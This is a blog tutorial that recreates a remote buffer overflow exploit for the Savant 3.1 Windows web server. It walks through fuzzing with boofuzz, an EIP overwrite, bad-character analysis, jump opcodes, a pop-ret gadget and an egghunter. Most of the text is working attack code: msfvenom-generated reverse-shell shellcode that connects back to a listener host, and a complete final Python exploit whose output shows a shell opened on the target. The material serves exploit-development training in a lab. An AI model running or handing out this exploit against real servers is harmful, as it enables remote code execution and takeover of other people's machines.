---
title: Savant 3.1 webserver buffer overflow exploit
author: Stipe Marinovic
date: 2020-07-24 23:00:00 +0800
categories: [Blogging, Tutorial, Exploit]
tags: [fuzzing, shellcoding, exploit]
toc: true
---

## Introduction ##

Next in a series of recreating (rewriting) remote buffer overflow exploits is Savant 3.1. 
Based on description from SourceForge: Savant is a freeware open source web server that runs on Windows 9x, ME, NT, 2000, 
and XP turning any desktop computer into a powerful web server. Application can be downloaded from: http://savant.sourceforge.net/. 
Vulnerability was originally discovered by muts (Mati Aharoni) years ago.


## Fuzzing ##

First step in buffer overflow exploit research and development is to find a way to crash the application. 
Once application is crashed, we can explore the way it was crashed and see if it can be exploited in useful way. 
For that purpose we are using fuzzer, which is an application used to generate various payload based on user specified template. 
There are more than few fuzzers available today such as: Spike, Sulley, Boofuzz,... 
In this walktrough we will be using python script with boofuzz module.  
  
When we use standard python script with boofuzz module and common http template, sadly, the application doesn't crash.

* Initial fuzzer  

```
#!/usr/bin/python
import sys
from boofuzz import *

host = '172.16.24.213'
port = 80

def main():

   session = Session(target = Target(connection = SocketConnection(host, port, proto='tcp')))

   s_initialize("Sarvant GET")
   s_string("GET", fuzzable = False)
   s_delim(" ", fuzzable = False)
   s_string("/", fuzzable = False)
   s_string("FUZZ", fuzzable = True)
   s_delim(" ", fuzzable = False)
   s_string("HTTP/1.1", fuzzable = False)
   s_string("\r\n", fuzzable = False)

   s_string("Host:", fuzzable =False)
   s_delim(" ", fuzzable = False)
   s_string("172.16.24.213", fuzzable = True)
   s_string("\r\n", fuzzable = False)

   s_string("User-Agent", fuzzable =False)
   s_delim(" ", fuzzable = False)
   s_string("FUZZ", fuzzable = True)
   s_string("\r\n", fuzzable = False)

   s_string("Accept:", fuzzable =False)
   s_delim(" ", fuzzable = False)
   s_string("FUZZ", fuzzable = True)
   s_string("\r\n", fuzzable = False)

   s_static("Connection: close\r\n")
   s_string("\r\n", fuzzable = False)

   session.connect(s_get("Sarvant GET"))
   session.fuzz()

if __name__ == "__main__":
    main()
```
  
But if we setup ```post_test_case_callbacks``` function call to capute response from web server after the payload was sent, we can see that application is not always returning expected output which should start with ```HTTP/1.1``` following with status code (200, 301, 404 etc.) as defined in HTTP protocol. Based on that observation we can setup our fuzzer to save all payloads which didn't return expected response in a file.

* Updated fuzzer  

```
#!/usr/bin/python
import sys
from boofuzz import *

host = '172.16.24.213'
port = 80

def receive_response(target, fuzz_data_logger, session, sock):
   data=sock.recv(20000)
   print (data)
   if not "HTTP/1.1" in data:
      f = open("savant_crash_report.txt", "a")
      f.write(session.last_send+"\n\n")
      f.close()
      
def main():

   session = Session(post_test_case_callbacks=[receive_response], sleep_time=0.2, target = Target(connection = SocketConnection(host, port, proto='tcp')))
   
   s_initialize("Sarvant GET")
   s_string("GET", fuzzable = False)
   s_delim(" ", fuzzable = False)
   s_string("/", fuzzable = False)
   s_string("FUZZ", fuzzable = True)
   s_delim(" ", fuzzable = False)
   s_string("HTTP/1.1", fuzzable = False)
   s_string("\r\n", fuzzable = False)

   s_string("Host:", fuzzable =False)
   s_delim(" ", fuzzable = False)
   s_string("172.16.24.213", fuzzable = True)
   s_string("\r\n", fuzzable = False)

   s_string("User-Agent", fuzzable =False)
   s_delim(" ", fuzzable = False)
   s_string("FUZZ", fuzzable = True)
   s_string("\r\n", fuzzable = False)

   s_string("Accept:", fuzzable =False)
   s_delim(" ", fuzzable = False)
   s_string("FUZZ", fuzzable = True)
   s_string("\r\n", fuzzable = False)

   s_static("Connection: close\r\n")
   s_string("\r\n", fuzzable = False)

   session.connect(s_get("Sarvant GET"))
   session.fuzz()

if __name__ == "__main__":
    main()
```

Once fuzzing cycle is finished, we can see that majority of payloads which didn't returned expected reposnse have something in common. Every payload has at least one "%" character.

![Fuzzing results](https://github.com/smarinovic/smarinovic.github.io/blob/master/assets/img/savant_1.png?raw=true)


We can further explore this finding by writing custom fuzzer which would establish connection and send one "%" char and usual junk (for example sequence of "A"s):

```
#!/usr/bin/python

import socket
import time

host = "172.16.24.213"
port = 80

for x in range (1, 5000):
   buffer = "GET /%" + x * "A" + " HTTP/1.1\r\n"
   buffer += "Host: 172.16.24.212\r\nUser-Agent FUZZ\r\nAccept: FUZZ\r\nConnection: close\r\n\r\n"

   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   s.connect((host,port))
   s.send(buffer)
   s.close()
   print ("X="+str(x))
   time.sleep(0.5)
   x=x+1
```

After 268 chars, application crashes:

![Fuzzing results](https://github.com/smarinovic/smarinovic.github.io/blob/master/assets/img/savant_2.png?raw=true)

![Fuzzing results](https://github.com/smarinovic/smarinovic.github.io/blob/master/assets/img/savant_3.png?raw=true)



Great! Now we can start to dig deeper. 

## EIP overwrite ##

Let's attach Immunity Debugger (or OllyDbg) to application and observe behaviour.
After little bit of playing with payload lenght we can conclude that ```EIP``` gets fully overwritten if we send ```GET /%``` plus 270 "A" characters (hex 41 eaqules to ASCII "A") and ``` HTTP/1.1\r\n``` at the end which can be seen in following screenshot (```ÈIP``` is overwritten with 41414141 which eaquals to 4 "A" characters.

![EIP overwrite](https://github.com/smarinovic/smarinovic.github.io/blob/master/assets/img/savant_4.png?raw=true)

But if we send 4 more characters, application crashes in a way that we don't have control over ```EIP``` anymore as ```EIP``` is not overwritten with expected payload (```\x41```).

![EIP overwrite fail](https://github.com/smarinovic/smarinovic.github.io/blob/master/assets/img/savant_5.png?raw=true)

Ok, so we are limited to ```GET /%``` plus 270 characters and it seems that none of the registers is pointing to the beggining of the payload.  
But if we explore some more, we can see that ```GET``` keyword is close to the top of the stack (4 bytes away). In order to reach it, we would need to find address pointing to ```pop ... ret```sequence. ```pop``` would remove 4 bytes from the stack by loading it to some register (for example ```pop eax``` would load 4 bytes in ```eax``` register) and ```ret``` would execute what ever is left on top of the stack (which is beggining of our payload). 

![Stack](https://github.com/smarinovic/smarinovic.github.io/blob/master/assets/img/savant_6.png?raw=true)

By examining "follow in dump" address where ```GET```is located we can see that the rest of our payload (AAAAA...) is located aprox 25 bytes further away from ```GET```keyword.

![Stack](https://github.com/smarinovic/smarinovic.github.io/blob/master/assets/img/savant_7.png?raw=true)

One more interesting thing. If we replace GET with CCC in proof of concept script as follows:

```
#buffer = "GET /%" + 270 * "A" + " HTTP/1.1\r\n"
buffer = "CCC /%" + 270 * "A" + " HTTP/1.1\r\n"
```
we still get ```EIP``` overwritten, meaning that overflow is non dependat on ```GET``` keyword. This finding allow us to place opcodes for instructions we need (and we would need to jump 25 bytes in order to reach place where we could place our shellcode) instead of ```GET``` keyword. 

![HTTP method](https://github.com/smarinovic/smarinovic.github.io/blob/master/assets/img/savant_8.png?raw=true)

## Finding bad chars ##

Next step is to find bad characters which cannot be used in payload.
Standard way of finding bad characters is to create a list of all characters, send it as payload and observe if application still get crashed, and if it does, are all sent characters displayed correctly.

```
badchars = ("\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
```

Before we send anything, we can remove ```\x00``` from the list as it is well known bad char. Null byte (```\x00```) is used to terminate sting and as such it breaks payoad.  
  
This vulnerability is quite interesting. If we send badchars as payload after http method (which is first couple of bytes) and ```/%```we only get ```\x00\x0a\x3f``` as bad chars.
  
But when we test first couple of bytes which defines http method (GET, POST…) for bad chars we can conclude that it is more sensitive to bad chars. List of bad chars used for http method is much much longer:

```
\x00\x0a\x3f\x09\x0d\x1e\x1f\x20\x21\x22\x23\x28
\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c
\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78
\x79\x7a\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9
\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4
\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xf
```

So when we are writing shell code which will be placed after ```/%``` we cannot use following bad characters: ```\x00\x0a\x3f``` but when we are overwrigint first few bytes of payload (HTTP method) we cannot use following bad characters: ```\x00\x0a\x3f\x09\x0d\x1e\x1f\x20\x21\x22\x23\x28\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xf```


## Jump to shell code ##

Next we need to find opcodes which would preform jump 25 bytes on the stack. 
Based on this tutorial: https://www.tutorialspoint.com/assembly_programming/assembly_conditions.htm there are two kinds of jumps which can be preformed in assembly language:

* Unconditional jump: this is performed by the JMP instruction. Conditional execution often involves a transfer of control to the address of an instruction that does not follow the currently executing instruction. Transfer of control may be forward, to execute a new set of instructions or backward, to re-execute the same steps.
  * Conditional jump: this is performed by a set of jump instructions j<condition> depending upon the condition. The conditional instructions transfer the control by breaking the sequential flow and they do it by changing the offset value in IP.

Opcodes for jump instructions can be found on following page: http://unixwiz.net/techtips/x86-jumps.html
	
![opcodes](https://github.com/smarinovic/smarinovic.github.io/blob/master/assets/img/savant_9.png?raw=true)

Unconditional jump is not possible as opcode for unconditional jump ```\xeb```is badcharacter. So we need to use one of "good" characters suchs as following: 

![whitelist opcodes](https://github.com/smarinovic/smarinovic.github.io/blob/master/assets/img/savant_10.png?raw=true)

Let's use JNLE instruction. For example, we can put value x02 in AL register and compare AL with 0x1. Result of such instruction will be "not less or equal" so we could use "jumo if not less of equal" (JNLP) instruction for jumping.

```
nasm > cmp al, 01
00000000  3C01              cmp al,0x1
nasm > mov al, 02
00000000  B002              mov al,0x2
nasm > 
```

Opcodes for such jump is following: ```\xb0\x02\x3c\x01\x7f\x14```.  

```
jump ="\xb0\x02\x3c\x01\x7f\x14"
buffer = jump + " /%" + "\x43" * (276 - len(jump)) + " HTTP/1.1\r\n"
buffer += "Host: 172.16.24.212\r\nUser-Agent FUZZ\r\nAccept: FUZZ\r\nConnection: close\r\n\r\n"
```

We can see that opcodes are unmodified on the stack:

![jump opcodes on stack](https://github.com/smarinovic/smarinovic.github.io/blob/master/assets/img/savant_11.png?raw=true)

Next, we need to find ```POP something RET``` instruction sequence in available modules. Mona has found more that few of them:

```
0x004169a1 : pop edi # retn | startnull {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v3.1 (C:\VulnerableSoftware\Savant\Savant.exe)
0x00416a80 : pop edi # retn | startnull {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v3.1 (C:\VulnerableSoftware\Savant\Savant.exe)
0x00416a8d : pop edi # retn | startnull {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v3.1 (C:\VulnerableSoftware\Savant\Savant.exe)
0x00416a96 : pop edi # retn | startnull {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v3.1 (C:\VulnerableSoftware\Savant\Savant.exe)
0x00416a9e : pop edi # retn | startnull {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v3.1 (C:\VulnerableSoftware\Savant\Savant.exe)
0x00417358 : pop edi # retn | startnull,asciiprint,ascii,alphanum {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v3.1 (C:\VulnerableSoftware\Savant\Savant.exe)
0x00417362 : pop edi # retn | startnull,asciiprint,ascii,alphanum {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v3.1 (C:\VulnerableSoftware\Savant\Savant.exe)
0x004173a6 : pop edi # retn | startnull {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v3.1 (C:\VulnerableSoftware\Savant\Savant.exe)
0x004173b6 : pop edi # retn | startnull {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v3.1 (C:\VulnerableSoftware\Savant\Savant.exe)
0x004173c1 : pop edi # retn | startnull {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v3.1 (C:\VulnerableSoftware\Savant\Savant.exe)
0x00417428 : pop edi # retn | startnull,asciiprint,ascii {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v3.1 (C:\VulnerableSoftware\Savant\Savant.exe)
0x00417457 : pop edi # retn | startnull,asciiprint,ascii,alphanum {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v3.1 (C:\VulnerableSoftware\Savant\Savant.exe)
0x004174cc : pop edi # retn | startnull {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v3.1 (C:\VulnerableSoftware\Savant\Savant.exe)
0x004175e8 : pop edi # retn | startnull {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v3.1 (C:\VulnerableSoftware\Savant\Savant.exe)
0x004175ee : pop edi # retn | startnull {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v3.1 (C:\VulnerableSoftware\Savant\Savant.exe)
0x004181b5 : pop edi # retn | startnull {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v3.1 (C:\VulnerableSoftware\Savant\Savant.exe)
0x004181c7 : pop edi # retn | startnull {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v3.1 (C:\VulnerableSoftware\Savant\Savant.exe)
0x004189dd : pop edi # retn | startnull {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v3.1 (C:\VulnerableSoftware\Savant\Savant.exe)
0x0041b44c : pop edi # retn | startnull {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v3.1 (C:\VulnerableSoftware\Savant\Savant.exe)
0x0041bc81 : pop edi # retn | startnull {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v3.1 (C:\VulnerableSoftware\Savant\Savant.exe)
0x0041c9fd : pop edi # retn | startnull {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v3.1 (C:\VulnerableSoftware\Savant\Savant.exe)
0x00421144 : pop edi # retn | startnull,ascii {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v3.1 (C:\VulnerableSoftware\Savant\Savant.exe)
0x0042119c : pop edi # retn | startnull {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v3.1 (C:\VulnerableSoftware\Savant\Savant.exe)
```

We can choose the last one ```0x0042119c```.
Address has a null byte so we cannot use it in payload as such, but since there are nullbytes in front of EIP location we can perform three byte overwrite by sending only three bytes and shortening payload length. By doing that null byte will be automaticaly "added" to address on the stack.
  
When we generate reverse shell payload, it takes more than 270 bytes we have at our disposal so we cannot place it in payload. What we can do is to generate egghunter and place reverse shell code somewhere else in a memory. We can add it after last header to act as POST request payload. We will tag shellcode with two instances of egg (w00t) and let egghunter search for it. Once egghunter finds two eggs, it redirect execution of a program to shellcode which is located after the second egg.

```
msfvenom -p windows/shell_reverse_tcp LHOST=172.16.24.204 LPORT=4444 -f python -a x86 -b "\x00\x0a\x3f"
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of python file: 1712 bytes
buf =  b""
buf += b"\xda\xc4\xb8\x8b\xf1\x1b\x53\xd9\x74\x24\xf4\x5e\x29"
buf += b"\xc9\xb1\x52\x31\x46\x17\x03\x46\x17\x83\x4d\xf5\xf9"
buf += b"\xa6\xad\x1e\x7f\x48\x4d\xdf\xe0\xc0\xa8\xee\x20\xb6"
buf += b"\xb9\x41\x91\xbc\xef\x6d\x5a\x90\x1b\xe5\x2e\x3d\x2c"
buf += b"\x4e\x84\x1b\x03\x4f\xb5\x58\x02\xd3\xc4\x8c\xe4\xea"
buf += b"\x06\xc1\xe5\x2b\x7a\x28\xb7\xe4\xf0\x9f\x27\x80\x4d"
buf += b"\x1c\xcc\xda\x40\x24\x31\xaa\x63\x05\xe4\xa0\x3d\x85"
buf += b"\x07\x64\x36\x8c\x1f\x69\x73\x46\x94\x59\x0f\x59\x7c"
buf += b"\x90\xf0\xf6\x41\x1c\x03\x06\x86\x9b\xfc\x7d\xfe\xdf"
buf += b"\x81\x85\xc5\xa2\x5d\x03\xdd\x05\x15\xb3\x39\xb7\xfa"
buf += b"\x22\xca\xbb\xb7\x21\x94\xdf\x46\xe5\xaf\xe4\xc3\x08"
buf += b"\x7f\x6d\x97\x2e\x5b\x35\x43\x4e\xfa\x93\x22\x6f\x1c"
buf += b"\x7c\x9a\xd5\x57\x91\xcf\x67\x3a\xfe\x3c\x4a\xc4\xfe"
buf += b"\x2a\xdd\xb7\xcc\xf5\x75\x5f\x7d\x7d\x50\x98\x82\x54"
buf += b"\x24\x36\x7d\x57\x55\x1f\xba\x03\x05\x37\x6b\x2c\xce"
buf += b"\xc7\x94\xf9\x41\x97\x3a\x52\x22\x47\xfb\x02\xca\x8d"
buf += b"\xf4\x7d\xea\xae\xde\x15\x81\x55\x89\xb5\x46\x4d\x85"
buf += b"\xae\x64\x6d\x04\x73\xe0\x8b\x4c\x9b\xa4\x04\xf9\x02"
buf += b"\xed\xde\x98\xcb\x3b\x9b\x9b\x40\xc8\x5c\x55\xa1\xa5"
buf += b"\x4e\x02\x41\xf0\x2c\x85\x5e\x2e\x58\x49\xcc\xb5\x98"
buf += b"\x04\xed\x61\xcf\x41\xc3\x7b\x85\x7f\x7a\xd2\xbb\x7d"
buf += b"\x1a\x1d\x7f\x5a\xdf\xa0\x7e\x2f\x5b\x87\x90\xe9\x64"
buf += b"\x83\xc4\xa5\x32\x5d\xb2\x03\xed\x2f\x6c\xda\x42\xe6"
buf += b"\xf8\x9b\xa8\x39\x7e\xa4\xe4\xcf\x9e\x15\x51\x96\xa1"
buf += b"\x9a\x35\x1e\xda\xc6\xa5\xe1\x31\x43\xd5\xab\x1b\xe2"
buf += b"\x7e\x72\xce\xb6\xe2\x85\x25\xf4\x1a\x06\xcf\x85\xd8"
buf += b"\x16\xba\x80\xa5\x90\x57\xf9\xb6\x74\x57\xae\xb7\x5c"
```

Generating egghunter:

```
/usr/bin/msf-egghunter -b "\x00\x0a\x3f" -a x86 -p windows -e "w00t" -f python
buf =  b""
buf += b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c"
buf += b"\x05\x5a\x74\xef\xb8\x77\x30\x30\x74\x89\xd7\xaf\x75"
buf += b"\xea\xaf\x75\xe7\xff\xe7"
```

## Final exploit ##

When we put it all together exploit code is following:

```
#!/usr/bin/python                                                                                                                                

import socket
import time

host = "172.16.24.213"
port = 80

jump ="\xb0\x02\x3c\x01\x7f\x16"  # opcode for jumping 26 bytes
eip = "\x9c\x11\x42"              # three byte overwrite

# Egghunter
egghunter =  b""
egghunter += b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c"
egghunter += b"\x05\x5a\x74\xef\xb8\x77\x30\x30\x74\x89\xd7\xaf\x75"
egghunter += b"\xea\xaf\x75\xe7\xff\xe7"

# Reverse shellcode
buf =  b""
buf += b"\xda\xc4\xb8\x8b\xf1\x1b\x53\xd9\x74\x24\xf4\x5e\x29"
buf += b"\xc9\xb1\x52\x31\x46\x17\x03\x46\x17\x83\x4d\xf5\xf9"
buf += b"\xa6\xad\x1e\x7f\x48\x4d\xdf\xe0\xc0\xa8\xee\x20\xb6"
buf += b"\xb9\x41\x91\xbc\xef\x6d\x5a\x90\x1b\xe5\x2e\x3d\x2c"
buf += b"\x4e\x84\x1b\x03\x4f\xb5\x58\x02\xd3\xc4\x8c\xe4\xea"
buf += b"\x06\xc1\xe5\x2b\x7a\x28\xb7\xe4\xf0\x9f\x27\x80\x4d"
buf += b"\x1c\xcc\xda\x40\x24\x31\xaa\x63\x05\xe4\xa0\x3d\x85"
buf += b"\x07\x64\x36\x8c\x1f\x69\x73\x46\x94\x59\x0f\x59\x7c"
buf += b"\x90\xf0\xf6\x41\x1c\x03\x06\x86\x9b\xfc\x7d\xfe\xdf"
buf += b"\x81\x85\xc5\xa2\x5d\x03\xdd\x05\x15\xb3\x39\xb7\xfa"
buf += b"\x22\xca\xbb\xb7\x21\x94\xdf\x46\xe5\xaf\xe4\xc3\x08"
buf += b"\x7f\x6d\x97\x2e\x5b\x35\x43\x4e\xfa\x93\x22\x6f\x1c"
buf += b"\x7c\x9a\xd5\x57\x91\xcf\x67\x3a\xfe\x3c\x4a\xc4\xfe"
buf += b"\x2a\xdd\xb7\xcc\xf5\x75\x5f\x7d\x7d\x50\x98\x82\x54"
buf += b"\x24\x36\x7d\x57\x55\x1f\xba\x03\x05\x37\x6b\x2c\xce"
buf += b"\xc7\x94\xf9\x41\x97\x3a\x52\x22\x47\xfb\x02\xca\x8d"
buf += b"\xf4\x7d\xea\xae\xde\x15\x81\x55\x89\xb5\x46\x4d\x85"
buf += b"\xae\x64\x6d\x04\x73\xe0\x8b\x4c\x9b\xa4\x04\xf9\x02"
buf += b"\xed\xde\x98\xcb\x3b\x9b\x9b\x40\xc8\x5c\x55\xa1\xa5"
buf += b"\x4e\x02\x41\xf0\x2c\x85\x5e\x2e\x58\x49\xcc\xb5\x98"
buf += b"\x04\xed\x61\xcf\x41\xc3\x7b\x85\x7f\x7a\xd2\xbb\x7d"
buf += b"\x1a\x1d\x7f\x5a\xdf\xa0\x7e\x2f\x5b\x87\x90\xe9\x64"
buf += b"\x83\xc4\xa5\x32\x5d\xb2\x03\xed\x2f\x6c\xda\x42\xe6"
buf += b"\xf8\x9b\xa8\x39\x7e\xa4\xe4\xcf\x9e\x15\x51\x96\xa1"
buf += b"\x9a\x35\x1e\xda\xc6\xa5\xe1\x31\x43\xd5\xab\x1b\xe2"
buf += b"\x7e\x72\xce\xb6\xe2\x85\x25\xf4\x1a\x06\xcf\x85\xd8"
buf += b"\x16\xba\x80\xa5\x90\x57\xf9\xb6\x74\x57\xae\xb7\x5c"

buffer = jump + " /%" + "\x43" * 10 + egghunter + "\x43" * (276 - 10 - len(jump) - len(eip) - 1 - len(egghunter)) + eip + " HTTP/1.1\r\n"
buffer += "Connection: close\r\n\r\n" + "w00tw00t"  + buf

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
s.send(buffer)
s.close()

print ("[+] Payload sent")
```
![Fuzzing results](https://github.com/smarinovic/smarinovic.github.io/blob/master/assets/img/savant_12.png?raw=true)

And it works! Reverse shell is established.
